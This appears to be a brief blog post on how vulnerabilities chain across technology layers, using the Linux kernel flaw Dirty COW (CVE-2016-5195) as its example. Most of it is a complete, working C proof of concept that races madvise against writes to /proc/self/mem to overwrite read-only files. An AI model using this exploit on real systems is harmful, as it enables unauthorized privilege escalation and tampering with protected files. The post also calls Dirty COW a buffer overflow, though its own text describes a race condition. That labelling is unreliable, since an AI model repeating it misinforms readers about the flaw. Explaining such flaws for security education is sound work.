---
title: Chain effect of vulnerabilities
date: 2024-11-23 10H:21:00 -0300
categories: [Cybersecurity, Vulnerabilities]
tags: [cybersecurity, vulnerabilities, CVE, devsecops]
author: 0
description:
image:
  path: https://upload.wikimedia.org/wikipedia/commons/7/73/Logo_nmap.png?20230731104508
  alt: Picture
---

# Chain effect of vulnerabilities
The different implementation layers of digital technologies create dependencies that can sometimes lead to security failures with a "chain effect," thereby impacting the underlying technologies.

## Real-world Example: CVE-2016-5195 (Dirty COW)
- Reference: [Nist: CVE-2016-5195](https://nvd.nist.gov/vuln/detail/cve-2016-5195)
One of the most infamous buffer overflow vulnerabilities in the Linux kernel is CVE-2016-5195, also known as Dirty COW. This vulnerability allowed attackers to gain write access to read-only memory mappings, leading to privilege escalation. The issue was due to a race condition in the kernel's memory subsystem, which could be exploited to overwrite data in memory.

The exploit for Dirty COW was relatively simple and could be executed with a few lines of code, making it a significant threat. The vulnerability had existed in the Linux kernel for nine years before it was discovered and patched.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <pthread.h>
#include <unistd.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg) {
  int i;
  for (i = 0; i < 1000000; i++)
    madvise(map, 100, MADV_DONTNEED);
  return NULL;
}

void *procselfmemThread(void *arg) {
  int f = open("/proc/self/mem", O_RDWR);
  int i;
  for (i = 0; i < 1000000; i++) {
    lseek(f, (uintptr_t) map, SEEK_SET);
    write(f, name, strlen(name));
  }
  return NULL;
}

int main(int argc, char *argv[]) {
  pthread_t pth1, pth2;
  f = open(argv[1], O_RDONLY);
  fstat(f, &st);
  name = argv[2];
  map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
  pthread_create(&pth1, NULL, madviseThread, NULL);
  pthread_create(&pth2, NULL, procselfmemThread, NULL);
  pthread_join(pth1, NULL);
  pthread_join(pth2, NULL);
  return 0;
}
```

This example demonstrates how a buffer overflow vulnerability can lead to severe security incidents, emphasizing the importance of secure coding practices and regular security audits as [Secutiry Controls in DevOps and Pipeline](./2024-11-23-Preventive-Security-Controls.md)